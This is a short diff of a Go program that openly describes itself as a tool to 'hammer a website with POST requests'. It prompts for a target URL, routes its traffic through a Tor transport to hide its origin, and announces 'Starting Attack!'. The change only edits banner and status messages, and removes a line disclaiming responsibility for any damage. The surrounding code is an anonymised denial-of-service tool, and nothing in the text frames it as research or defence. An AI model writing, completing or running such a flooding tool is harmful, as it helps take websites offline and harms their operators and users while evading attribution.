@@ -21,9 +21,6 @@ func main() {
 	screen.Clear()
 	screen.Clear()
 	fmt.Println(asciiArt)
-	fmt.Println("This script will hammer a website with POST requests.")
-	fmt.Println("I am NOT responsible for ANYTHING you do with my code or any damage you may cause!")
-	fmt.Println("Wait 30 seconds before checking the status of your target after the attack begins.")
 	runtime.GOMAXPROCS(0)
 	//Ask user for URL
 	fmt.Println("Enter URL:")
@@ -42,9 +39,9 @@ func main() {
 	client := &http.Client{Transport: torTransport, Timeout: time.Second * 2}
 
 	screen.Clear()
-	fmt.Println("Wait for the timeout...")
-	fmt.Println("Starting Attack!")
 	screen.Clear()
+	fmt.Println(asciiArt)
+	fmt.Println("Starting Attack!")
 
 	//Form data for POST request
 	qwerty := "0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
